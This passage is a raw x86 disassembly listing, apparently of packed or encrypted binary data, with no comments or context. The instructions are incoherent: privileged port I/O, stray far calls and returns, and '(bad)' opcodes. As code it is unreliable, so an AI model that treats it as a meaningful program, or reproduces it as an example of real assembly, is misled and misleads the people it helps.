  409293:	mov    cl,0x17
  409295:	xor    eax,0x1608bbc
  40929a:	pop    eax
  40929b:	mul    BYTE PTR [ebx-0x4]
  40929e:	aad    0x5
  4092a0:	add    al,0xfa
  4092a2:	stos   BYTE PTR es:[edi],al
  4092a3:	addr16 push esp
  4092a5:	scas   eax,DWORD PTR es:[edi]
  4092a6:	add    esp,ebp
  4092a8:	enter  0x5caf,0x5c
  4092ac:	iret   
  4092ad:	jp     0x4092a9
  4092af:	jg     0x409270
  4092b1:	rcr    BYTE PTR [edx+0x12],0x22
  4092b5:	je     0x409311
  4092b7:	scas   eax,DWORD PTR es:[edi]
  4092b8:	fsub   st,st(7)
  4092ba:	test   al,0x77
  4092bc:	cmp    eax,0x1346ac8
  4092c1:	xor    bl,BYTE PTR [esi]
  4092c3:	sbb    al,0xf7
  4092c5:	mov    ecx,0xd1be4e47
  4092ca:	push   es
  4092cb:	jnp    0x409265
  4092cd:	pop    ss
  4092ce:	add    eax,0xd13cf09a
  4092d3:	mov    ebp,0x3d98e76f
  4092d8:	loope  0x4092cf
  4092da:	mov    al,ds:0x509fd91c
  4092df:	adc    al,0x30
  4092e1:	pop    edx
  4092e2:	pop    edx
  4092e3:	mov    eax,0xf97c9c32
  4092e8:	sub    eax,0x3040769e
  4092ed:	mov    bh,0x74
  4092ef:	fs leave 
  4092f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f2:	lea    edx,[ebx-0x2fea657b]
  4092f8:	adc    ah,BYTE PTR [edx]
  4092fa:	pop    edx
  4092fb:	into   
  4092fc:	sub    WORD PTR cs:[edx],bp
  409300:	dec    ebx
  409301:	loope  0x4092fd
  409303:	inc    esp
  409304:	test   eax,0x38bc8e5b
  409309:	lock mov ch,0x69
  40930c:	dec    eax
  40930d:	addr16 cwde 
  40930f:	iret   
  409310:	and    DWORD PTR [edx+0x1df1e351],ebx
  409316:	pop    ebx
  409317:	xor    bl,bh
  409319:	test   BYTE PTR [edi-0x28],dl
  40931c:	fs in  eax,0x18
  40931f:	bound  ebp,QWORD PTR [eax-0x5e4fb042]
  409325:	jp     0x409394
  409327:	mov    ah,0x55
  409329:	fcomp  DWORD PTR [edx+0x44303393]
  40932f:	aam    0x55
  409331:	push   ebp
  409332:	lea    eax,ds:0x8d0ce742
  409338:	xchg   ecx,eax
  409339:	aaa    
  40933a:	retf   
  40933b:	fucomip st,st(3)
  40933d:	loope  0x40932a
  40933f:	sbb    ebx,DWORD PTR [ecx]
  409341:	inc    eax
  409342:	pop    edx
  409343:	xchg   BYTE PTR [ecx+0x32],dl
  409346:	loope  0x40936c
  409348:	mov    ds:0x164814fa,eax
  40934d:	add    al,0xd1
  40934f:	mov    al,0xf8
  409351:	cmp    ebx,DWORD PTR [ebx+0x16e4f79b]
  409357:	out    0xc5,eax
  409359:	aad    0x9d
  40935b:	pop    ebp
  40935c:	ds ja  0x409305
  40935f:	daa    
  409360:	sub    al,BYTE PTR [edx-0x5]
  409363:	cmp    BYTE PTR [edi-0xf],ch
  409366:	ficom  DWORD PTR cs:[eax]
  409369:	in     eax,0xbc
  40936b:	fidivr WORD PTR [esi+eiz*2+0x63dada53]
  409372:	push   0x27
  409374:	addr16 xor al,0x63
  409377:	xor    ch,BYTE PTR es:[edx-0x19d40e25]
  40937e:	mov    esp,0xc5886e0c
  409383:	cli    
  409384:	pop    es
  409385:	stc    
  409386:	inc    esi
  409387:	dec    eax
  409388:	pop    ss
  409389:	mov    bl,BYTE PTR [edx-0x46]
  40938c:	mov    al,0xb8
  40938e:	xchg   edx,ecx
  409390:	sahf   
  409391:	pop    ds
  409392:	push   0xce944884
  409397:	ret    
  409398:	ds add eax,0x7f2d110d
  40939e:	mov    ebx,0x16e68476
  4093a3:	pop    esp
  4093a4:	ror    ebp,0xf5
  4093a7:	mov    BYTE PTR [ebp+0x6d62b65],al
  4093ad:	mov    ds,WORD PTR [ebp+0x3a]
  4093b0:	pop    esp
  4093b1:	xchg   edi,eax
  4093b2:	fwait
  4093b3:	mov    al,ds:0xe57ee80f
  4093b8:	xchg   edx,eax
  4093b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ba:	mov    cl,0x17
  4093bc:	or     al,BYTE PTR [edi]
  4093be:	mov    al,ds:0xb9f6826b
  4093c3:	nop
  4093c4:	jbe    0x4093aa
  4093c6:	pop    ebx
  4093c7:	sub    BYTE PTR [ebp+ecx*8+0x1bf08c00],ah
  4093ce:	xor    DWORD PTR [esi-0x46],esp
  4093d1:	mov    edi,0x5b5f84ee
  4093d6:	cli    
  4093d7:	jne    0x409417
  4093d9:	aad    0xe0
  4093db:	call   0xe702:0xa5e642dd
  4093e2:	pusha  
  4093e3:	pop    ebx
  4093e4:	mov    BYTE PTR [edi+0x15c273f7],dl
  4093ea:	(bad)  [esi+0x16]
  4093ed:	retf   
  4093ee:	pop    ebx
  4093ef:	nop
  4093f0:	sahf   
  4093f1:	(bad)  
  4093f2:	int    0x87
  4093f4:	outs   dx,DWORD PTR ds:[esi]
  4093f5:	xchg   ebx,eax
  4093f6:	xchg   BYTE PTR [edi+edi*1-0x5a],bl
  4093fa:	(bad)  
  4093fb:	jmp    0x409383
  4093fd:	pop    ebp
  4093fe:	popa   
  4093ff:	sub    BYTE PTR [esi],bh
  409401:	fcomp  QWORD PTR gs:[ebx+0x52]
  409405:	enter  0xf2c,0x37
  409409:	out    0xf2,al
  40940b:	daa    
  40940c:	cmp    BYTE PTR [edi+0x133db5fb],dh
  409412:	jmp    DWORD PTR [eax+0x85c28e5]
  409418:	sub    ah,BYTE PTR [ebp+0x55]
  40941b:	clc    
  40941c:	xchg   BYTE PTR [ebp+eiz*1-0x42],dl
  409420:	or     al,0xd7
  409422:	jg     0x4093dc
  409424:	int    0x22
  409426:	inc    eax
  409427:	test   DWORD PTR [eax-0x66946c54],ebp
  40942d:	inc    esi
  40942e:	pop    ebx
  40942f:	inc    eax
  409430:	mov    eax,ds:0x5011eec2
  409435:	jmp    DWORD PTR [ecx-0xf]
  409438:	aas    
  409439:	add    eax,0x11b5e12d
  40943e:	in     al,dx
  40943f:	shl    DWORD PTR [esi+0x4b],0x53
  409443:	inc    ecx
  409444:	add    DWORD PTR [ecx],edx
  409446:	jecxz  0x40941b
  409448:	call   0xe7b27028
  40944d:	xchg   ebp,eax
  40944e:	lock idiv BYTE PTR [ecx+esi*8]
  409452:	cmp    al,0x13
  409454:	mov    ecx,0xe8ab9264
  409459:	xchg   esi,eax
  40945a:	sub    al,BYTE PTR ds:0xebb4673e
  409460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409461:	adc    DWORD PTR [edi+0x2e],edx
  409464:	xchg   edi,esp
  409466:	dec    eax
  409467:	sahf   
  409468:	xor    al,0xe
  40946a:	or     dh,BYTE PTR [ecx+edi*1-0x4b]
  40946e:	mov    ecx,0x5bb21a0a
  409473:	pop    eax
  409474:	hlt    
  409475:	in     eax,dx
  409476:	and    al,0x36
  409478:	xchg   edx,eax
  409479:	fst    DWORD PTR [eax]
  40947b:	test   dl,bl
  40947d:	mov    cl,BYTE PTR [edi-0x41]
  409480:	aas    
  409481:	popf   
  409482:	push   ebp
  409483:	neg    BYTE PTR ds:[edx+ebp*1-0x47]
  409488:	les    edi,FWORD PTR [edi-0x6e]
  40948b:	mov    dh,0x3f
  40948d:	jno    0x409430
  40948f:	outs   dx,DWORD PTR ds:[esi]
  409490:	in     al,dx
  409491:	dec    edi
  409492:	leave  
  409493:	retf   
  409494:	add    dl,BYTE PTR ds:0xab3e989d
  40949a:	mov    edi,0xcdef4c72
  40949f:	dec    esp
  4094a0:	inc    eax
  4094a1:	push   ebx
  4094a2:	xchg   edi,eax
  4094a3:	test   BYTE PTR [esi-0x35],ch
  4094a6:	adc    al,0x7f
  4094a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094aa:	jo     0x4094f1
  4094ac:	adc    BYTE PTR [esi],0x9c
  4094af:	mov    al,ds:0x2bee6eb
  4094b4:	out    dx,al
  4094b5:	mov    ch,0x9c
  4094b7:	xchg   ebp,eax
  4094b8:	dec    ecx
  4094b9:	adc    DWORD PTR [edx],edi
  4094bb:	jae    0x4094fb
  4094bd:	imul   ebx,DWORD PTR [edx+0x4eedc2fd],0xffffffb2
  4094c4:	adc    dh,ah
  4094c6:	xor    BYTE PTR [ebx-0x2],bl
  4094c9:	jp     0x409520
  4094cb:	adc    ebp,DWORD PTR [esi+0x7d5e5e83]
  4094d1:	addr16 pop ebx
  4094d3:	rcl    BYTE PTR [ebx],1
  4094d5:	add    al,0x3a
  4094d7:	scas   eax,DWORD PTR es:[edi]
  4094d8:	push   ecx
  4094d9:	out    0x9c,al
  4094db:	pop    esp
  4094dc:	jmp    0xff7a:0x531f73c3
  4094e3:	and    cl,BYTE PTR [edi+esi*8+0x414fa65b]
  4094ea:	or     BYTE PTR [esi+ebx*2-0x41654f3d],bl
  4094f1:	cdq    
  4094f2:	scas   eax,DWORD PTR es:[edi]
  4094f3:	in     al,dx
  4094f4:	stos   DWORD PTR es:[edi],eax
  4094f5:	das    
  4094f6:	and    BYTE PTR [ebx-0x73a70d63],dl
  4094fc:	fidiv  WORD PTR [eax+eax*4-0x47d70816]
  409503:	jge    0x409533
  409505:	ficomp DWORD PTR ds:0xd8dc4885
  40950b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40950c:	inc    ecx
  40950d:	adc    eax,0x7c0fc83d
  409512:	ins    DWORD PTR es:[edi],dx
  409513:	test   DWORD PTR [edi+0x2a512ae2],ebx
  409519:	push   esp
  40951a:	cmp    DWORD PTR [esp+ebp*4+0x3f06d141],eax
  409521:	icebp  
  409522:	or     esp,DWORD PTR [esi-0x62e81f0a]
  409528:	sbb    edi,esp
  40952a:	stos   BYTE PTR es:[edi],al
  40952b:	xor    eax,0x8820f64d
  409530:	(bad)  
  409531:	fbstp  TBYTE PTR [esi-0x48]
  409534:	iret   
  409535:	(bad)  
  409536:	push   edi
  409537:	push   eax
  409538:	lahf   
  409539:	out    0xd6,al
  40953b:	or     eax,0x9dcbfe06
  409540:	fwait
  409541:	push   ebx
  409542:	sbb    ebx,esp
  409544:	add    esi,DWORD PTR [esi]
  409546:	push   esp
  409547:	mov    dl,0xfe
  409549:	or     bl,BYTE PTR [ebp-0x25187f3e]
  40954f:	mov    WORD PTR [esi+0x35],?
  409552:	lods   eax,DWORD PTR ds:[esi]
  409553:	push   es
  409554:	add    al,0x1b
  409556:	pop    esi
  409557:	xchg   BYTE PTR [edx-0x74],ch
  40955a:	pop    ebx
  40955b:	sbb    al,0x52
  40955d:	nop
  40955e:	fwait
  40955f:	xor    eax,0x85688082
  409564:	test   BYTE PTR [edi+0x233e2d1b],0xda
  40956b:	retf   0xc33
  40956e:	pop    esi
  40956f:	fnsave [eax+ebp*8-0x1574a216]
  409576:	jp     0x409513
  409578:	cmp    al,0x43
  40957a:	mov    bl,0xf3
  40957c:	addr16 dec esi
  40957e:	adc    DWORD PTR [edi],ebp
  409580:	aas    
  409581:	daa    
  409582:	xchg   edx,eax
  409583:	aam    0x95
  409585:	mov    ecx,0xe7eab2f8
  40958a:	cs loop 0x409593
  40958d:	sub    eax,esi
  40958f:	jge    0x409587
  409591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409592:	loope  0x40951c
  409594:	ds mov ebp,0x581f95af
  40959a:	pushf  
  40959b:	out    0x17,eax
  40959d:	out    0xaa,al
  40959f:	and    BYTE PTR [esi+edi*1],0x1b
  4095a3:	fild   DWORD PTR ss:[eax+0x34ea3f1f]
  4095aa:	pop    edx
  4095ab:	sub    BYTE PTR ds:0xea10776,dl
  4095b1:	inc    eax
  4095b2:	pop    esi
  4095b3:	test   DWORD PTR [eax+0x3d74a831],esi
  4095b9:	mov    ebx,0x18820e14
  4095be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095bf:	add    ch,BYTE PTR [esi-0xb73db60]
  4095c5:	xchg   BYTE PTR [edi],dh
  4095c7:	test   BYTE PTR [eax],ch
  4095c9:	mov    ecx,0xf3284196
  4095ce:	pop    es
  4095cf:	push   ebp
  4095d0:	mov    bh,ah
  4095d2:	pop    ss
  4095d3:	dec    ebx
  4095d4:	lds    edi,FWORD PTR [ebp-0x3e]
  4095d7:	jb     0x409593
  4095d9:	mov    ch,BYTE PTR [eax+0x39d89ab9]
  4095df:	add    al,0x3b
  4095e1:	and    DWORD PTR [ebp+ebx*2+0x785b480d],eax
  4095e8:	inc    ebx
  4095e9:	xchg   ebx,eax
  4095ea:	clc    
  4095eb:	out    0xb4,eax
  4095ed:	rol    BYTE PTR [esi],0x84
  4095f0:	jnp    0x4095b6
  4095f2:	jno    0x4095f3
  4095f4:	xlat   BYTE PTR ds:[ebx]
  4095f6:	into   
  4095f7:	cwde   
  4095f8:	jle    0x409679
  4095fa:	call   0x863f:0x7211ddcb
  409601:	pop    ecx
  409602:	xor    al,0x80
  409604:	mov    al,ds:0x42940f65
  409609:	out    0xb7,eax
  40960b:	mov    ecx,0xa84d70d3
  409610:	outs   dx,DWORD PTR ds:[esi]
  409611:	out    0xa8,eax
  409613:	sub    al,ch
  409615:	pop    edx
  409616:	pop    esi
  409617:	xor    eax,0x2c9c00ee
  40961c:	jns    0x409676
  40961e:	pop    edx
  40961f:	push   ss
  409620:	xchg   esp,eax
  409621:	loope  0x4095c7
  409623:	inc    ecx
  409624:	and    eax,0xf565cec1
  409629:	out    0x68,al
  40962b:	loop   0x409681
  40962d:	dec    ebx
  40962e:	xlat   BYTE PTR ds:[ebx]
  40962f:	adc    DWORD PTR ds:0x5ba8e0b,edi
  409635:	push   ss
  409636:	cmp    al,bh
  409638:	mov    edi,0xa03e3544
  40963d:	mov    ebp,0xf9b385d3
  409642:	loope  0x4095c4
  409644:	push   es
  409645:	fbstp  TBYTE PTR [ebx]
  409647:	cmc    
  409648:	and    BYTE PTR [esi-0x35b729dd],bl
  40964e:	mov    ah,0xc5
  409650:	and    bh,ah
  409652:	adc    ah,0x9d
  409655:	in     eax,dx
  409656:	lea    ecx,ds:0x9fbcfce
  40965c:	int3   
  40965d:	test   DWORD PTR [edi+0x5b80a694],esi
  409663:	jmp    0x818a:0x537982f3
  40966a:	lock test cl,bl
  40966d:	in     al,dx
  40966e:	hlt    
  40966f:	fcmovbe st,st(7)
  409671:	mov    edx,edi
  409673:	icebp  
  409674:	wbinvd 
  409676:	pop    edx
  409677:	sub    dh,bl
  409679:	cmp    eax,0x24a6fe2a
  40967e:	in     eax,dx
  40967f:	mov    ecx,0x5f971b2
  409684:	out    0xc9,al
  409686:	ss push ebx
  409688:	pusha  
  409689:	xchg   esp,eax
  40968a:	pop    edx
  40968b:	mov    al,ds:0xf8cb741e
  409690:	outs   dx,BYTE PTR ds:[esi]
  409691:	loop   0x4096bd
  409693:	test   BYTE PTR [esi+0x3ef0f051],bh
  409699:	cdq    
  40969a:	cwde   
  40969b:	out    dx,al
  40969c:	push   eax
  40969d:	mov    ch,0xed
  40969f:	mov    ebp,0x1840ab0a
  4096a4:	mov    edx,0x7c4528ef
  4096a9:	out    0x3f,eax
  4096ab:	ret    
  4096ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096ad:	pop    ecx
  4096ae:	fbld   TBYTE PTR [edi]
  4096b0:	cmp    DWORD PTR [eax-0x381d0fa6],eax
  4096b6:	inc    edi
  4096b7:	fld    TBYTE PTR [eax]
  4096b9:	xor    edx,DWORD PTR [eax-0x5f9bac7c]
  4096bf:	inc    edi
  4096c0:	cmp    al,0x2f
  4096c2:	dec    ecx
  4096c3:	das    
  4096c4:	iret   
  4096c5:	fwait
  4096c6:	sti    
  4096c7:	data16 scas al,BYTE PTR es:[edi]
  4096c9:	dec    edx
  4096ca:	outs   dx,BYTE PTR ds:[esi]
  4096cb:	sbb    DWORD PTR [eax+0xe85a768],edx
  4096d1:	push   0x3e
  4096d3:	stos   BYTE PTR es:[edi],al
  4096d4:	aas    
  4096d5:	imul   edi,DWORD PTR [edi+ecx*1],0xe0232dad
  4096dc:	sbb    BYTE PTR [bp+si],ch
  4096df:	add    esi,esi
  4096e1:	xor    DWORD PTR [esp+eax*4-0x720d8594],ebx
  4096e8:	xor    DWORD PTR [edi-0x66774e13],esp
  4096ee:	sub    edi,0x78
  4096f1:	std    
  4096f2:	pop    eax
  4096f3:	fcomi  st,st(5)
  4096f5:	out    0x8a,al
  4096f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096f8:	test   DWORD PTR [edx-0x76980a15],ecx
  4096fe:	and    DWORD PTR [esi-0x11a407f9],esi
  409704:	mov    edx,0x9870eaea
  409709:	adc    eax,0xd4e384c7
  40970e:	mov    ds:0xba9338e1,al
  409713:	dec    ebp
  409714:	xchg   esp,eax
  409715:	dec    esi
  409716:	xchg   ebx,eax
  409717:	out    0x26,eax
  409719:	cld    
  40971a:	dec    edx
  40971b:	test   edx,edi
  40971d:	js     0x4096e1
  40971f:	lds    edi,FWORD PTR [esi]
  409721:	std    
  409722:	and    DWORD PTR [ebx],esp
  409724:	sub    cl,BYTE PTR [eax+0xd]
  409727:	lar    esp,ax
  40972a:	retf   0x2641
  40972d:	aaa    
  40972e:	jns    0x4096e0
  409730:	into   
  409731:	(bad)  
  409732:	fist   DWORD PTR [eax-0x7f3c6ec8]
  409738:	in     eax,0x8b
  40973a:	rcl    esp,0xfb
  40973d:	in     eax,dx
  40973e:	sub    edx,DWORD PTR [ebx+edx*8]
  409741:	loope  0x40977d
  409743:	dec    ecx
  409744:	imul   ecx,DWORD PTR [ebp-0x16],0x8a58af5b
  40974b:	rol    DWORD PTR [ecx],1
  40974d:	mov    ch,0x7
  40974f:	inc    esp
  409750:	ds cmp al,dh
  409753:	rol    DWORD PTR [eax+0x2af2b806],0xad
  40975a:	or     edi,DWORD PTR [edx+0x482add9]
  409760:	jnp    0x40978e
  409762:	mov    ecx,DWORD PTR [ecx]
  409764:	or     eax,0x20bc5bc8
  409769:	jle    0x409754
  40976b:	xchg   ebp,eax
  40976c:	ror    bl,0x8b
  40976f:	test   BYTE PTR [ecx+eiz*8],dh
  409772:	dec    eax
  409773:	loop   0x4097b3
  409775:	inc    ebp
  409776:	mov    ebp,0x613d5339
  40977b:	sbb    ch,BYTE PTR [eax+0x723f34e6]
  409781:	pop    eax
  409782:	xchg   edx,eax
  409783:	rcr    edx,0x56
  409786:	imul   ebp,DWORD PTR [ecx+0x66597dbd],0xffffffef
  40978d:	cli    
  40978e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40978f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409790:	or     al,0xe6
  409792:	xchg   edx,eax
  409793:	ftst   
  409795:	adc    ecx,edx
  409797:	sahf   
  409798:	mov    bh,0x85
  40979a:	mov    dl,0xff
  40979c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40979d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40979e:	pop    ebx
  40979f:	mov    esi,0x1203b588
  4097a4:	push   cs
  4097a5:	dec    esp
  4097a6:	imul   eax,DWORD PTR [ebp-0x53aef91f],0x2dae433e
  4097b0:	into   
  4097b1:	aas    
  4097b2:	and    eax,0x98e1b06c
  4097b7:	mov    esp,0x5420bbc2
  4097bc:	fisubr WORD PTR [esi-0x56c10d36]
  4097c2:	inc    ebx
  4097c3:	cmp    al,0xcc
  4097c5:	ins    BYTE PTR es:[edi],dx
  4097c6:	scas   al,BYTE PTR es:[edi]
  4097c7:	dec    esp
  4097c8:	mov    esp,edi
  4097ca:	stos   BYTE PTR es:[edi],al
  4097cb:	into   
  4097cc:	push   edi
  4097cd:	add    ebp,esp
  4097cf:	xchg   ebx,eax
  4097d0:	popa   
  4097d1:	cmp    eax,0xb1bf2541
  4097d6:	pop    edx
  4097d7:	dec    eax
  4097d8:	js     0x409812
  4097da:	add    BYTE PTR ds:0x4e278bf,dl
  4097e0:	int3   
  4097e1:	daa    
  4097e2:	jg     0x409853
  4097e4:	ret    
  4097e5:	iret   
  4097e6:	pop    ecx
  4097e7:	data16 lahf 
  4097e9:	fistp  QWORD PTR [edx-0x240d1456]
  4097ef:	and    al,dh
  4097f1:	xchg   ebp,eax
  4097f2:	scas   eax,DWORD PTR es:[edi]
  4097f3:	xchg   DWORD PTR [ebp-0x404281c8],ecx
  4097f9:	daa    
  4097fa:	jno    0x409809
  4097fc:	push   ebx
  4097fd:	dec    ecx
  4097fe:	pop    ebx
  4097ff:	into   
  409800:	es mov cl,0x4f
  409803:	mov    al,ds:0x845fe12e
  409808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409809:	mov    BYTE PTR [esi-0x17],al
  40980c:	sub    DWORD PTR ds:[edx],ecx
  40980f:	sti    
  409810:	adc    eax,0x5c061efb
  409815:	out    0xac,al
  409817:	sub    ah,cl
  409819:	xchg   ebx,eax
  40981a:	out    dx,eax
  40981b:	dec    ebx
  40981c:	or     edi,esi
  40981e:	jnp    0x409821
  409820:	inc    ecx
  409821:	pop    sp
  409823:	ins    BYTE PTR es:[edi],dx
  409824:	xchg   esp,eax
  409825:	ss jmp 0x4097c8
  409828:	mov    edi,0x9fafa4e6
  40982d:	fcomp  QWORD PTR ds:0xfff28e21
  409833:	cmp    BYTE PTR [eax-0x7a],cl
  409836:	inc    esp
  409837:	lods   al,BYTE PTR ds:[esi]
  409838:	dec    esi
  409839:	pop    esi
  40983a:	out    dx,al
  40983b:	inc    ebp
  40983c:	addr16 out 0xb4,al
  40983f:	mov    ch,0xfa
  409841:	fbstp  TBYTE PTR ds:0xa3b58e1c
  409847:	lock fs (bad) 
  40984a:	pop    edi
  40984b:	cld    
  40984c:	add    DWORD PTR [edi+0x2a],esp
  40984f:	outs   dx,WORD PTR ds:[esi]
  409851:	out    0x20,eax
  409853:	push   esp
  409854:	cmp    BYTE PTR [ebx],ch
  409856:	mov    edx,0xc4441906
  40985b:	mov    bh,0x8a
  40985d:	mov    edi,0x6033105b
  409862:	sub    al,BYTE PTR [ebx-0x78be9aac]
  409868:	mov    ah,0x33
  40986a:	adc    esp,DWORD PTR [ebx]
  40986c:	in     al,0x7e
  40986e:	xchg   esi,eax
  40986f:	add    al,0x3e
  409871:	sub    eax,0x9be0cef2
  409876:	xchg   edx,eax
  409877:	and    BYTE PTR [edx-0x18],ah
  40987a:	push   ss
  40987b:	or     DWORD PTR [eax-0x2c552f71],esi
  409881:	cmp    al,0x58
  409883:	inc    ebp
  409884:	aas    
  409885:	dec    ebp
  409886:	dec    edx
  409887:	(bad)  
  409888:	lods   eax,DWORD PTR ds:[esi]
  409889:	mov    ebx,0xe75af9ce
  40988e:	pushf  
  40988f:	nop
  409890:	push   esp
  409891:	addr16 fwait
  409893:	push   0x13
  409895:	cmp    eax,DWORD PTR [ecx]
  409897:	push   0x3fbfdf22
  40989c:	push   ds
  40989d:	and    BYTE PTR [eax+eax*4],al
  4098a0:	jns    0x4098a9
  4098a2:	or     DWORD PTR [edi+0x72bedb57],ebp
  4098a8:	mul    esi
  4098aa:	ja     0x409840
  4098ac:	xchg   esi,eax
  4098ad:	outs   dx,DWORD PTR es:[esi]
  4098af:	ds dec esp
  4098b1:	pop    ebx
  4098b2:	mov    edi,0x8cfddc99
  4098b7:	mov    ch,al
  4098b9:	out    0x4e,al
  4098bb:	retf   
  4098bc:	loopne 0x409883
  4098be:	jmp    0x409934
  4098c0:	cmp    al,BYTE PTR [ecx]
  4098c2:	inc    edx
  4098c3:	xchg   al,ah
  4098c5:	xor    cl,BYTE PTR ds:0x8b4f4136
  4098cb:	cs aas 
  4098cd:	mov    ebp,0xd79b7470
  4098d2:	dec    edx
  4098d3:	jl     0x409926
  4098d5:	out    0x2a,eax
  4098d7:	popf   
  4098d8:	pop    eax
  4098d9:	mov    bh,0x4a
  4098db:	or     ebx,edi
  4098dd:	xchg   BYTE PTR [esp+eax*2+0x45],dl
  4098e1:	arpl   WORD PTR [edx-0x6134fcc3],bx
  4098e7:	test   DWORD PTR [ebp+0x2c5b1a80],eax
  4098ed:	pusha  
  4098ee:	scas   eax,DWORD PTR es:[edi]
  4098ef:	mov    bh,BYTE PTR [ecx]
  4098f1:	dec    esi
  4098f2:	jp     0x40993f
  4098f4:	neg    DWORD PTR [ecx-0x42c1fbe2]
  4098fa:	mov    ebp,0x164449a
  4098ff:	shr    BYTE PTR [edi],cl
  409901:	out    0x60,eax
  409903:	jle    0x4098b9
  409905:	jbe    0x409984
  409907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409908:	cmp    eax,0x3742cb39
  40990d:	retf   0x9a61
  409910:	(bad)  
  409911:	out    0xdb,al
  409913:	ret    
  409914:	popf   
  409915:	out    0x82,eax
  409917:	cdq    
  409918:	dec    ebp
  409919:	in     eax,dx
  40991a:	ja     0x409928
  40991c:	xchg   ebx,eax
  40991d:	mov    ebp,0x27eb15c6
  409922:	pop    edx
  409923:	push   0xffffffbd
  409925:	cmp    eax,0x84d6efe6
  40992a:	lock test BYTE PTR [edi+edx*4],cl
  40992e:	push   edi
  40992f:	out    dx,al
  409930:	ds std 
  409932:	aad    0x46
  409934:	pop    ecx
  409935:	cmc    
  409936:	xor    eax,0x60e7ea72
  40993b:	(bad)  
  40993c:	push   ss
  40993d:	ret    0x4059
  409940:	fdiv   DWORD PTR [ebp-0xc]
  409943:	add    BYTE PTR [ecx+0x213259ff],bh
  409949:	out    dx,eax
  40994a:	add    eax,0x9adb13aa
  40994f:	fisttp DWORD PTR [esi+eiz*2-0x3e166388]
  409956:	loopne 0x409939
  409958:	ds inc ebp
  40995a:	xor    DWORD PTR [edx-0x7],ebp
  40995d:	xor    al,0xf7
  40995f:	add    bh,bl
  409961:	pop    ds
  409962:	sub    DWORD PTR [ecx-0x64],ebp
  409965:	mov    ds:0xf6ad856a,eax
  40996a:	icebp  
  40996b:	push   ebp
  40996c:	cmp    eax,0x20e602b1
  409971:	and    eax,DWORD PTR [ebx]
  409973:	imul   ecx,DWORD PTR [esi+0x5af17474],0x785b6e1
  40997d:	mov    ch,0xe3
  40997f:	pop    ecx
  409980:	sbb    DWORD PTR ds:0x773ebf0a,ebx
  409986:	add    dh,0x7e
  409989:	js     0x409978
  40998b:	mov    edx,0xbfd1488c
  409990:	(bad)
  409993:	mov    eax,0x8514bfe5
  409998:	repz loopne 0x409974
  40999b:	dec    edi
  40999c:	jp     0x4099c0
  40999e:	pop    ebp
  40999f:	fidiv  WORD PTR [edx]
  4099a1:	hlt    
  4099a2:	push   ecx
  4099a3:	adc    eax,0xcc6f7699
  4099a8:	sahf   
  4099a9:	pop    ds
  4099aa:	cmc    
  4099ab:	dec    edi
  4099ac:	xlat   BYTE PTR ds:[ebx]
  4099ad:	out    0xcc,eax
  4099af:	push   ecx
  4099b0:	rol    edi,0xef
  4099b3:	sbb    BYTE PTR [ecx],al
  4099b5:	sbb    al,0x79
  4099b7:	(bad)  
  4099b8:	stos   DWORD PTR es:[edi],eax
  4099b9:	lods   al,BYTE PTR ds:[esi]
  4099ba:	inc    ebp
  4099bb:	push   0x2a
  4099bd:	xchg   esi,ebx
  4099bf:	test   BYTE PTR [edi+eiz*8+0x56],dl
  4099c3:	xchg   ch,dl
  4099c5:	es (bad) 
  4099c7:	das    
  4099c8:	xchg   esi,eax
  4099c9:	loopne 0x4099a5
  4099cb:	jecxz  0x40997a
  4099cd:	jno    0x409a2a
  4099cf:	repnz inc esp
  4099d1:	mov    bl,BYTE PTR ds:0xe000b6bd
  4099d7:	popf   
  4099d8:	jnp    0x4099e0
  4099da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099db:	lods   eax,DWORD PTR ds:[esi]
  4099dc:	mul    edi
  4099de:	sub    ah,BYTE PTR [esp+edx*4-0x59c1cf33]
  4099e5:	hlt    
  4099e6:	or     WORD PTR [esi-0x7a],0xbfb3
  4099ec:	fistp  DWORD PTR [eax]
  4099ee:	pop    ebp
  4099ef:	iret   
  4099f0:	iret   
  4099f1:	(bad)  
  4099f2:	int3   
  4099f3:	leave  
  4099f4:	aas    
  4099f5:	mov    ch,0xd7
  4099f7:	dec    eax
  4099f8:	push   edi
  4099f9:	xor    DWORD PTR [ecx+0x24e5b9e6],edi
  4099ff:	lock clc 
  409a01:	dec    dh
  409a03:	sbb    al,0xc3
  409a05:	outs   dx,BYTE PTR ds:[esi]
  409a06:	mov    ds:0xae352d5a,eax
  409a0b:	cli    
  409a0c:	mov    ebp,0xf7dff4e7
  409a11:	int3   
  409a12:	lods   eax,DWORD PTR ds:[esi]
  409a13:	repnz inc edx
  409a15:	fld    DWORD PTR [esi+0x322f3185]
  409a1b:	aas    
  409a1c:	cmp    al,BYTE PTR [ecx-0x47c8287b]
  409a22:	xor    ah,BYTE PTR [eax+eiz*8+0x72]
  409a26:	in     al,0x45
  409a28:	js     0x409a5d
  409a2a:	mov    ?,WORD PTR [edi+0x592dd19]
  409a30:	mov    ?,eax
  409a32:	fmul   DWORD PTR [eax+0x585af53a]
  409a38:	daa    
  409a39:	lods   al,BYTE PTR ds:[esi]
  409a3a:	pop    ebp
  409a3b:	jnp    0x409a9b
  409a3d:	xchg   BYTE PTR [esi-0x7b],dh
  409a40:	sar    esp,cl
  409a42:	outs   dx,BYTE PTR ds:[esi]
  409a43:	enter  0xbf3e,0xe9
  409a47:	add    cl,BYTE PTR [edi]
  409a49:	dec    esp
  409a4a:	mov    cs,WORD PTR [ecx+0x7a189772]
  409a50:	aas    
  409a51:	fcmovnb st,st(6)
  409a53:	add    al,0x64
  409a55:	out    dx,al
  409a56:	(bad)  [ecx]
  409a58:	ds jno 0x409a7c
  409a5b:	dec    edx
  409a5c:	leave  
